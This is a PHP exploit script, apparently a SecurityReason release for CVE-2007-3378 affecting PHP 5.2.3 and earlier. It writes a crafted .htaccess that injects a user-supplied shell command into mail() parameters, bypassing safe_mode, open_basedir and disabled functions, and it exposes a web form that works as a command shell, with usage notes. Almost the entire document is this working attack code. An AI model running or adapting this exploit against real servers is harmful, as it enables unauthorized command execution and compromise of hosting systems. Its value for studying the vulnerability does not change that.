<?php
# SecurityReason 
# Coded by Maksymilian Arciemowicz
# (C) Copyright SecurityReason
#
# Advisory :
http://securityreason.com/achievement_securityalert/45
# Orginal Exploit :
http://securityreason.com/achievement_exploitalert/9 
# 
# SecurityAlert : 45
# CVE : CVE-2007-3378
# SecurityRisk : High
# Remote Exploit : No
# Local Exploit : Yes
# Affected Software : PHP 5.2.3 and prior
#
# This exploit bypass safe_mode , open_basedir and disbale
functions .
# First it creates crafted .htaccess file and then all executed
commands are written to result.txt file using mail(); function.
# Usage : 
# ?cxib=dhr - Delete Delete .htaccess and result.txt
# ?sh=[our_command] - Execute the command 
# 

#variables
$htaccess="./.htaccess";
#variables


if(@mail("", "", "")==FALSE){
die("mail() function isn't active.");
}

if(!is_writable("./")){
die("This directory isn't writable.");
}

if($_GET['cxib']=="dhr"){
@unlink("./.htaccess");
@unlink("./result.txt");
}

$usun="";
if(file_exists("./result.txt") AND
file_exists("./.htaccess")){
$usun .= "<p><a
href=\"http://".$_SERVER["HTTP_HOST"].
$_SERVER["SCRIPT_NAME"]."?cxib=dhr\">Delet
e .htaccess and result.txt</a>";
}


$htmlstart="<HTML>
<HEAD>
<TITLE>SecurityReason Exploit - PHP 5.2.3 and 
prior</TITLE>
</HEAD>
<BODY>";

$formtxt="<center><h1>Security<b><font

color=RED>R</font>eason</b></h1><p>Exp
loit for PHP 5.2.3 and 
prior</p><B><CENTER><FONT
COLOR=\"RED\">C</FONT>oded by
<b>Maksymilian Arciemowicz</b>

".$usun."
<p>Form:<br>

<form
action=\"http://".$_SERVER["HTTP_HOST"].$_SER
VER["SCRIPT_NAME"]."\" 
name=\"Form\" method=\"POST\">
sh# <input type=\"text\" name=\"sh\"
size=\"50\" value=\"\">
<input type=\"submit\" name=\"sent\"
value=\"Exec\">
</form>
</CENTER></B>";

$htmlend="</BODY>
</HTML>";

$path=dirname($_SERVER["SCRIPT_NAME"]);

if(empty($sh)){
if(empty($_GET['sh'])){
if(empty($_POST['sh'])){

echo $htmlstart.$formtxt;

if(file_exists("./result.txt")){
echo "<center><iframe
src=\"http://".$_SERVER["HTTP_HOST"].
$path."/result.txt\" height=300
width=1000></center>";
}

echo $htmlend;

exit();
} else {
$sh=$_POST['sh'];
}
} else {
$sh=$_GET['sh'];
}
}

if (!$handle = @fopen($htaccess, 'w')) {
echo "Cannot create
".$htaccess."<B>check your rights to this
directory.<P>. exit();";
exit;
}

$syntax="php_value mail.force_extra_parameters '-t
&& ".$sh." >
".dirname(__FILE__)."/result.txt'";

if (fwrite($handle, $syntax) === FALSE) {
echo "Cannot write to file
(".$htaccess.")";
exit;
}

if(!empty($_POST['sent'])){
@mail("", "", "Yeah");
sleep(2);
header("Location:
http://".$_SERVER["HTTP_HOST"].
$_SERVER["REQUEST_URI"]."?cxib=".date('s'));
exit();
}

?>